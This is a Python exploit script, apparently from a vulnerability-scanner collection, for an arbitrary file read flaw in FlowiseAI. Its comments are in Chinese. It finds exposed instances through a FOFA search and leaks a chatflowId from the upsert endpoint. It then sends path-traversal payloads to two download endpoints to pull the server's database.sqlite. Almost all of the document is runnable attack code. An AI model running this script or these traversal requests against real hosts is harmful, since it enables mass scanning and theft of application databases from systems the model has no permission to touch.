"""
name: FlowiseAI
CVE编号:
fofa 搜索: "FlowiseAI"
漏洞类型: 任意文件读取
FlowiseAI是一个基于Node.js和React构建的开源项目，提供直观的可视化界面来设计和部署AI工作流。它采用模块化架构，支持超过100种AI服务和工具的无缝集成。FlowiseAI /api/v1/get-upload-file 和 /api/v1/openai-assistants-file/download 两个接口存在任意文件读取漏洞
"""
import json
import os.path
import sys
from urllib.parse import urljoin
from src import api, utils

__all__ = [
    "search",
    "start"
]


def search(email, key):
    fofa = api.FOFA(email=email, key=key)
    return fofa.search("FlowiseAI")


def start(host, *args, **kwargs):
    """
    FlowiseAI是一个基于Node.js和React构建的开源项目，提供直观的可视化界面来设计和部署AI工作流。它采用模块化架构，支持超过100种AI服务和工具的无缝集成。FlowiseAI /api/v1/get-upload-file 和 /api/v1/openai-assistants-file/download 两个接口存在任意文件读取漏洞
    :param host: 目标地址
    :param args:
    :param kwargs:
    :return:
    """
    url = urljoin(host, "/api/v1/vector/upsert/")
    headers = {
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=9ba23d44616773ddb04e2747c630fe1b"

    }
    files = {
        "file": ("filename", 'asdf', "text/plain")
    }
    """
    先获取 chatflowId，然后使用 chatflowId 拼接 url 再次请求读取 database.sqlite 文件
    """
    try:
        response = utils.requests_url(url=url, method='post', files=files, timeout=8,
                                      headers=headers, status=False, *args, **kwargs)

        if '/' in response.json()['message']:
            chatflowId = response.json()['message'].split('/')[-1]
        else:
            return False

        url_get = f'{host}/api/v1/get-upload-file?chatflowId={chatflowId}&chatId=../.././&fileName=database.sqlite'

        response_get = utils.requests_url(url=url_get, method='get', headers=headers, *args, **kwargs)

        if len(response_get.text) > 200:
            return True

        url_post = f"{host}/api/v1/openai-assistants-file/download"
        data = {
            "chatflowId": str(chatflowId),
            "chatId": "../.././&fileName=database.sqlite"
        }
        response_post = utils.requests_url(url=url_post, method='post', headers=headers, data=json.dumps(data))

        if len(response_post.text) > 200:
            return True

        return False

    except Exception:
        return False


if __name__ == '__main__':
    vuln_name = os.path.basename(__file__).split('.')[0]
    if len(sys.argv) < 2:
        print(f"python <{vuln_name}> <host>")
        sys.exit()
    parameter = sys.argv[1]
    r_type = start(parameter)
    if r_type:
        print(f"{parameter} vuln {vuln_name}: True")
    else:
        print(f"{parameter} vuln {vuln_name}: False")
